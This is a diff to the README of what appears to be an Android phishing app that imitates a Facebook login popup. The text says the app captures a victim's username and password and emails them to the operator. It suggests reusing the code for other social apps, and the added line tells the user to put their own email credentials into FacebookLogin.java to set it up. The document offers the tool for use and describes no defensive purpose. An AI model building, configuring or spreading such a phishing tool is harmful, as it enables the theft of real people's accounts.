@@ -3,6 +3,7 @@
 here is the facebook phising authentication android application working of this application is smiliar to other application
 mainly if victim enter his username & password in that facebook popup activity then all those detail mail to your email id which is given for mailing
 you can use this project to create phising facebook apk for other social application also althrough main code is remain same
+once you download this project simply enter your email id and password in FacebookLogin.java file in line number 73
 
 
 
